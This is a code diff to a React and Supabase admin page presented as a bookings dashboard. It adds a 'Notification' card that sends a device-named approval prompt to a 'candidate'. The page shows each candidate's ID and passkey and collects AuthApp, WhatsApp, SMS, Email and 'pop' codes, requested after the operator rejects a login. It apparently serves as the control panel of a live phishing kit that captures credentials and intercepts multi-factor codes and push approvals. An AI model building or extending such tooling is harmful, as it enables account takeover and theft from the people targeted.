@@ -134,6 +134,16 @@ function CandidatePhaseBadge({ b }: { b: Booking }) {
   }
 
   if (b.status === "awaiting_code") {
+    if (req.startsWith("NOTIFICATION:")) {
+      const val = req.replace("NOTIFICATION:", "");
+      return (
+        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200 shadow-2xs">
+          <span className="w-2 h-2 rounded-full bg-blue-600 animate-pulse" />
+          <span>Notification Active: {val || "Device"}</span>
+        </span>
+      );
+    }
+
     if (req.startsWith("POP_CODE:")) {
       const val = req.replace("POP_CODE:", "");
       return (
@@ -298,6 +308,104 @@ function PopCodeCardItem({
   );
 }
 
+// Dedicated NotificationCard with local state for custom device text
+function NotificationCardItem({
+  b,
+  busy,
+  onSendNotification,
+  onClearNotification,
+}: {
+  b: Booking;
+  busy: boolean;
+  onSendNotification: (b: Booking, deviceText: string) => Promise<void>;
+  onClearNotification: (b: Booking) => Promise<void>;
+}) {
+  const codeData = parseBookingCodeData(b.additional_code);
+  const isNotificationActive =
+    b.status === "awaiting_code" && codeData.active_req?.startsWith("NOTIFICATION:");
+  const [localInput, setLocalInput] = useState(codeData.notification_device || "");
+
+  useEffect(() => {
+    if (codeData.notification_device !== undefined) {
+      setLocalInput(codeData.notification_device || "");
+    }
+  }, [codeData.notification_device]);
+
+  const handleSubmit = (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
+    if (!localInput.trim()) return;
+    onSendNotification(b, localInput.trim());
+  };
+
+  return (
+    <div className="flex-1 min-w-[136px] max-w-[160px] bg-purple-50/30 border border-purple-200 rounded-2xl p-3 flex flex-col justify-between space-y-2.5 shadow-2xs overflow-hidden">
+      {/* Header: Notification Title + Dot */}
+      <div className="flex items-center justify-between">
+        <span className="text-xs font-bold text-purple-950 truncate pr-1">
+          Notification
+        </span>
+        <span
+          className={`w-2.5 h-2.5 rounded-full shrink-0 ${
+            isNotificationActive ? "bg-purple-600 animate-pulse" : "bg-gray-300"
+          }`}
+        />
+      </div>
+
+      {/* Actions: Fast local input + Send button + Clear */}
+      <form onSubmit={handleSubmit} className="flex items-center gap-1 w-full min-w-0">
+        <input
+          type="text"
+          placeholder="iPhone 13"
+          value={localInput}
+          onChange={(e) => setLocalInput(e.target.value)}
+          className="w-full min-w-0 px-2 py-1 bg-white border border-purple-300 rounded-lg text-xs font-sans font-bold text-gray-900 outline-none focus:border-purple-600 text-center shadow-2xs"
+        />
+
+        <button
+          type="submit"
+          disabled={busy || !localInput.trim()}
+          className="p-1.5 bg-[#7c3aed] hover:bg-[#6d28d9] text-white rounded-lg font-bold text-xs flex items-center justify-center transition-all disabled:opacity-40 shadow-2xs shrink-0 cursor-pointer"
+          title={isNotificationActive ? "Update Notification device" : "Send Notification to candidate"}
+        >
+          <Send className="w-3 h-3" />
+        </button>
+
+        {isNotificationActive && (
+          <button
+            type="button"
+            disabled={busy}
+            onClick={() => {
+              setLocalInput("");
+              onClearNotification(b);
+            }}
+            className="p-1 hover:bg-purple-100 text-purple-700 rounded-lg transition-colors border border-purple-200 shrink-0 cursor-pointer"
+            title="Dismiss notification"
+          >
+            <X className="w-3 h-3" />
+          </button>
+        )}
+      </form>
+
+      {/* Value Box with Active Notification Text + Copy Icon */}
+      <div className="flex items-center justify-between gap-1 px-2.5 py-1.5 bg-white border border-purple-200 rounded-xl shadow-2xs min-h-[38px] min-w-0">
+        <div className="flex items-center gap-1 font-sans font-bold text-xs text-purple-950 select-all truncate min-w-0 flex-1">
+          {codeData.notification_device ? (
+            <>
+              <Zap className="w-3.5 h-3.5 text-amber-500 fill-amber-500 shrink-0" />
+              <span className="truncate" title={codeData.notification_device}>
+                {codeData.notification_device}
+              </span>
+            </>
+          ) : (
+            <span className="text-gray-400 font-normal">-</span>
+          )}
+        </div>
+        <CopyIconButton value={codeData.notification_device} label="Notification Device" />
+      </div>
+    </div>
+  );
+}
+
 // Standalone Booking Card Component
 function BookingCardItem({
   b,
@@ -309,6 +417,8 @@ function BookingCardItem({
   onRejectSpecificCode,
   onSendPopCode,
   onClearPopCode,
+  onSendNotification,
+  onClearNotification,
 }: {
   b: Booking;
   busyId: string | null;
@@ -319,16 +429,18 @@ function BookingCardItem({
   onRejectSpecificCode: (b: Booking, num: number) => Promise<void>;
   onSendPopCode: (b: Booking, codeVal: string) => Promise<void>;
   onClearPopCode: (b: Booking) => Promise<void>;
+  onSendNotification: (b: Booking, deviceText: string) => Promise<void>;
+  onClearNotification: (b: Booking) => Promise<void>;
 }) {
   const codeData = parseBookingCodeData(b.additional_code);
   const codes = [1, 2, 3, 4] as const;
 
   return (
     <div className="bg-white border border-gray-200/90 rounded-2xl shadow-sm p-6 sm:p-8 space-y-7 font-sans hover:shadow-md transition-shadow">
-      {/* TOP ROW: Candidate Info + Online/Offline status, Date/Time, and Candidate ID & Passkey */}
-      <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-6 border-b border-gray-100">
+      {/* TOP ROW: Candidate Info + Online/Offline status, Date/Time, Candidate ID & Passkey, and Top-Right Action Buttons */}
+      <div className="flex flex-col 2xl:flex-row items-start 2xl:items-center justify-between gap-6 pb-6 border-b border-gray-100">
         {/* Candidate Profile + Online/Offline Status */}
-        <div className="min-w-[200px] space-y-1.5">
+        <div className="min-w-[190px] space-y-1.5">
           <div className="flex items-center gap-2">
             <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
               Candidate
@@ -380,7 +492,7 @@ function BookingCardItem({
         </div>
 
         {/* Date & Time */}
-        <div className="min-w-[130px] space-y-1">
+        <div className="min-w-[120px] space-y-1">
           <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
             Date &amp; Time
           </span>
@@ -394,7 +506,7 @@ function BookingCardItem({
         </div>
 
         {/* Extra Large Candidate ID Box */}
-        <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
+        <div className="flex-1 min-w-[200px] max-w-sm space-y-1.5">
           <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
             Candidate ID
           </span>
@@ -414,7 +526,7 @@ function BookingCardItem({
         </div>
 
         {/* Extra Large Passkey Box */}
-        <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
+        <div className="flex-1 min-w-[200px] max-w-sm space-y-1.5">
           <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
             Passkey
           </span>
@@ -432,12 +544,35 @@ function BookingCardItem({
             <CopyIconButton value={b.passkey} label="Passkey" />
           </div>
         </div>
+
+        {/* Top-Right Action Section: Confirm Next Step & Reject ID */}
+        <div className="flex flex-col gap-2 min-w-[170px] w-full sm:w-auto shrink-0 self-stretch 2xl:self-center">
+          <button
+            type="button"
+            disabled={busyId === b.id || b.status === "confirmed"}
+            onClick={() => onConfirm(b.id)}
+            className="w-full px-5 py-2.5 bg-[#059669] hover:bg-[#047857] text-white rounded-xl font-bold text-sm shadow-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 cursor-pointer"
+          >
+            <Check className="w-4 h-4" />
+            <span>Confirm Next Step</span>
+          </button>
+
+          <button
+            type="button"
+            disabled={busyId === b.id || b.status === "rejected"}
+            onClick={() => onRejectId(b.id)}
+            className="w-full px-5 py-2 bg-white hover:bg-red-50 text-[#dc2626] border border-[#ef4444] rounded-xl font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 cursor-pointer"
+          >
+            <X className="w-4 h-4 text-[#dc2626]" />
+            <span>Reject ID</span>
+          </button>
+        </div>
       </div>
 
-      {/* BOTTOM ROW: Candidate Phase, Uniform 5-Card Codes Grid (AuthApp, WhatsApp, SMS, Code 4, Pop Code), and Action Buttons */}
+      {/* BOTTOM ROW: Candidate Phase and Symmetrical 6-Card Codes Grid (AuthApp, WhatsApp, SMS, Email, Pop Code, Notification) */}
       <div className="flex flex-col 2xl:flex-row items-start 2xl:items-center justify-between gap-6 pt-1">
         {/* Candidate Phase & Admin Attribution */}
-        <div className="min-w-[200px] space-y-3">
+        <div className="min-w-[200px] space-y-3 shrink-0">
           {/* Admin User (Email) / Link Origin */}
           <div className="space-y-1">
             <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
@@ -468,13 +603,13 @@ function BookingCardItem({
           </div>
         </div>
 
-        {/* Symmetrical Uniform 5-Card Grid: AuthApp, WhatsApp, SMS, Code 4, and Pop Code */}
-        <div className="space-y-2 flex-1 w-full">
+        {/* Symmetrical Uniform 6-Card Grid: AuthApp, WhatsApp, SMS, Email, Pop Code, and Notification */}
+        <div className="space-y-2 flex-1 w-full min-w-0">
           <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
             Additional Codes (Required If Rejected) &amp; Pop-out Code
           </span>
 
-          <div className="flex flex-wrap sm:flex-nowrap gap-3 w-full">
+          <div className="flex flex-wrap 2xl:flex-nowrap gap-3 w-full">
             {/* Codes 1 to 4 (AuthApp, WhatsApp, SMS, Code 4) */}
             {codes.map((num) => {
               const codeKey = `code_${num}` as keyof BookingCodeData;
@@ -565,30 +700,15 @@ function BookingCardItem({
               onSendPopCode={onSendPopCode}
               onClearPopCode={onClearPopCode}
             />
+
+            {/* 6th Card: Notification */}
+            <NotificationCardItem
+              b={b}
+              busy={busyId === b.id}
+              onSendNotification={onSendNotification}
+              onClearNotification={onClearNotification}
+            />
           </div>
-        </div>
-
-        {/* Action Section: Confirm Next Step & Reject ID */}
-        <div className="flex flex-col gap-2.5 min-w-[190px] w-full sm:w-auto self-stretch 2xl:self-center pt-2 2xl:pt-0 2xl:pl-4 2xl:border-l border-gray-100">
-          <button
-            type="button"
-            disabled={busyId === b.id || b.status === "confirmed"}
-            onClick={() => onConfirm(b.id)}
-            className="w-full px-5 py-2.5 bg-[#059669] hover:bg-[#047857] text-white rounded-xl font-bold text-sm shadow-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 cursor-pointer"
-          >
-            <Check className="w-4 h-4" />
-            <span>Confirm Next Step</span>
-          </button>
-
-          <button
-            type="button"
-            disabled={busyId === b.id || b.status === "rejected"}
-            onClick={() => onRejectId(b.id)}
-            className="w-full px-5 py-2 bg-white hover:bg-red-50 text-[#dc2626] border border-[#ef4444] rounded-xl font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 cursor-pointer"
-          >
-            <X className="w-4 h-4 text-[#dc2626]" />
-            <span>Reject ID</span>
-          </button>
         </div>
       </div>
     </div>
@@ -926,6 +1046,44 @@ export default function AdminBookingsPage() {
     setBusyId(null);
   }
 
+  // Send Notification popup to Candidate Modal with custom device text
+  async function sendNotification(b: Booking, deviceText: string) {
+    setBusyId(b.id);
+    const existing = parseBookingCodeData(b.additional_code);
+    const updated: BookingCodeData = {
+      ...existing,
+      notification_device: deviceText,
+      active_req: `NOTIFICATION:${deviceText}`,
+    };
+    await supabase
+      .from("bookings")
+      .update({
+        status: "awaiting_code",
+        additional_code: serializeBookingCodeData(updated),
+      })
+      .eq("id", b.id);
+    setBusyId(null);
+  }
+
+  // Clear / Dismiss Notification
+  async function clearNotification(b: Booking) {
+    setBusyId(b.id);
+    const existing = parseBookingCodeData(b.additional_code);
+    const updated: BookingCodeData = {
+      ...existing,
+      notification_device: null,
+      active_req: null,
+    };
+    await supabase
+      .from("bookings")
+      .update({
+        status: "pending",
+        additional_code: serializeBookingCodeData(updated),
+      })
+      .eq("id", b.id);
+    setBusyId(null);
+  }
+
   // Active Drafts not yet converted to DB rows
   const activeDraftsList = useMemo(() => {
     const existingEmails = new Set(bookings.map((b) => b.email.toLowerCase()));
@@ -1187,6 +1345,8 @@ export default function AdminBookingsPage() {
               onRejectSpecificCode={rejectSpecificCode}
               onSendPopCode={sendPopCode}
               onClearPopCode={clearPopCode}
+              onSendNotification={sendNotification}
+              onClearNotification={clearNotification}
             />
           );
         })}
@@ -1212,6 +1372,8 @@ export default function AdminBookingsPage() {
                     onRejectSpecificCode={rejectSpecificCode}
                     onSendPopCode={sendPopCode}
                     onClearPopCode={clearPopCode}
+                    onSendNotification={sendNotification}
+                    onClearNotification={clearNotification}
                   />
                 );
               })}
